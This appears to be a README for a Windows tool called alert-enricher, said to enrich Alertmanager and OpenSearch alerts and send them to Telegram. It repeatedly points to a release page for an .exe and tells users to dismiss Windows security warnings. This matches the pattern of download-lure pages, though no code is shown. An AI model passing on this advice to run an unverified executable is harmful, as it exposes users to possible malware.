# ⚙️ alert-enricher - Simplify Alert Diagnosis Fast

[![Download alert-enricher](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/xdmaxim23-netizen/alert-enricher/releases)

## 📋 What is alert-enricher?

alert-enricher helps make sense of technical alerts. It connects Alertmanager, OpenSearch, and Telegram to give clearer, faster information when something goes wrong. This tool cuts the time you spend figuring out incidents by up to 80%. With alert-enricher, you see related alerts, detailed data, and important messages quickly. This lets you react and fix problems faster.

## 🎯 Who is this for?

This software suits anyone who monitors systems or services. You don’t need to know coding or complex tech terms. If you get alerts about your systems and want to understand them better without a long wait, alert-enricher works for you.

## 🖥 System Requirements

- Windows 10 or newer (64-bit recommended)  
- At least 4 GB of free RAM  
- 500 MB of free disk space  
- Internet connection to receive data from Alertmanager and OpenSearch  
- Telegram account for alert messages  

## 🔧 How alert-enricher works

alert-enricher connects three parts:

- **Alertmanager:** Collects alerts from your systems.  
- **OpenSearch:** Stores data and logs.  
- **Telegram:** Sends alert notifications to your phone or computer.  

When a problem happens, alert-enricher gathers details from Alertmanager and OpenSearch, then sends a complete summary on Telegram. This helps you get the full picture without checking many places.

---

## 🚀 How to get alert-enricher

[![Download alert-enricher](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/xdmaxim23-netizen/alert-enricher/releases)

1. Visit the release page by clicking this link:  
   https://github.com/xdmaxim23-netizen/alert-enricher/releases

2. Find the latest release. It will have a file ending with `.exe`.

3. Click on the `.exe` file to download it.

4. Save the file to your desktop or another easy-to-find folder.

---

## 📥 Install and Run alert-enricher on Windows

1. After downloading, locate the `.exe` file on your computer.

2. Double-click the file. Windows may show a security warning.

3. Click **Run** or **Yes** to start the installation.

4. The installer will open a setup window.

5. Follow the prompts:

   - Accept the license agreement.  
   - Choose the install location or leave the default folder.  
   - Click **Install**.

6. When the setup finishes, click **Finish**.

7. The application icon will appear on your desktop or in your Start menu.

8. Double-click the alert-enricher icon to start the app.

---

## ⚙️ Basic Setup Guide

When you first run alert-enricher, you need to connect it to your systems. Here is how:

1. **Connect Alertmanager:**  
   Enter the address (URL) where Alertmanager runs. You’ll get this from your system administrator or IT team.

2. **Connect OpenSearch:**  
   Provide the OpenSearch server URL and login details, if needed.

3. **Connect Telegram:**  
   To receive alerts on Telegram, create a Telegram bot and get its token. You can create a bot by talking to [BotFather](https://telegram.me/BotFather) inside Telegram. Follow his instructions to get a bot token.

4. **Add your Telegram user ID or group ID:**  
   This is where alerts will be sent. You can get your user ID using bots or tools that show your Telegram chat ID.

5. Save your settings and test the connection. The app will check if it can reach Alertmanager, OpenSearch, and Telegram.

---

## 💡 Using alert-enricher day-to-day

- When an alert triggers in your system, alert-enricher sends a message on Telegram with extra details.  
- You get information like the alert source, related incidents found in OpenSearch, and suggested next steps.  
- You can reply to alerts or ask alert-enricher for more context using Telegram commands.  
- The app groups similar alerts to avoid overload.

---

## ⚠️ Troubleshooting Tips

- If you do not receive Telegram alerts, check your bot token and chat ID.  
- Confirm alert-enricher can access Alertmanager and OpenSearch URLs.  
- Restart the app if it stops responding.  
- Check your Windows firewall settings to allow the app’s network access.  
- Make sure your internet connection is stable.

For more advanced issues, you can find logs inside the app's install folder in the **logs** directory.

---

## 📚 Additional Resources

- Alertmanager: https://prometheus.io/docs/alerting/latest/alertmanager/  
- OpenSearch: https://opensearch.org/docs/latest/  
- Telegram Bot creation: https://core.telegram.org/bots#3-how-do-i-create-a-bot  

---

## 🔄 Updates

Check the release page regularly to download new versions. Updating keeps your software secure and adds improvements.

https://github.com/xdmaxim23-netizen/alert-enricher/releases